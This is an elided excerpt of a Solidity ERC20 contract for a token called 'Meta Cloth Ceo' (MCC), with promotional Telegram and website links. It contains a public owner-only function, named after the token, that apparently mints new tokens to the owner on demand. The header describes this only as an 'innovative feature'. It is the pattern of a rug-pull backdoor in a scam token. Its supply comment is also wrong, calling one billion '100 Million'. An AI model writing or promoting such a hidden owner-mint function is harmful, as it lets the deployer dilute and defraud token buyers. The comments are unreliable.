...
//
// $MetaClothCeo proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MetaClothCeo
// 📱 Website ::https://www.metaclothusceo.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaClothCeo(uint256 amount) public onlyOwner {
 _MetaClothCeo(msg.sender, amount);
    }
    ...
    function _MetaClothCeo(address account, uint256 amount) internal virtual {
...
contract $MetaClothCeo is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Cloth Ceo", "MCC") {
     _MetaClothCeo(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}